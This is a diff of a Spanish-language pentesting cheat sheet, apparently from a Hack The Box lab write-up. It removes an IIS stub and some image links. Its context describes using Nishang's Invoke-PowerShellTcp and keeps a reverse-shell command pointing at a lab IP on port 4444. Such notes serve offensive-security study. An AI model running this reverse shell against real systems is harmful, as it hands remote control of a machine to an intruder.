@@ -767,14 +767,6 @@ systeminfo
 ![image](https://github.com/gecr07/Acordeon/assets/63270579/9b123cd6-ed32-42b4-a551-26731068ad4c)
 
 
-## IIS 
-
-Las rutas de un IIS son
-
-````
-Prueba
-```
-
 ## Reverse shell for windows
 
 > Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. I’ll show the reverse shell, but there is a ton more stuff in here.
@@ -783,7 +775,6 @@ Prueba
 
 ###  Nishang (via Invoke-PowerShellTcp.ps1)
 
-![image](https://github.com/gecr07/Devel-HTB/assets/63270579/c1c683b6-fb64-4ff5-990c-a081247f9564)
 
 Entonces ponemos es linea hasta abajo del archivo con nuestra IP:
 
@@ -920,5 +911,5 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444
 
 ```
 
-![image](https://github.com/gecr07/Devel-HTB/assets/63270579/efb2a3c0-8208-4f8e-a911-8bb0336b5699)
+
 
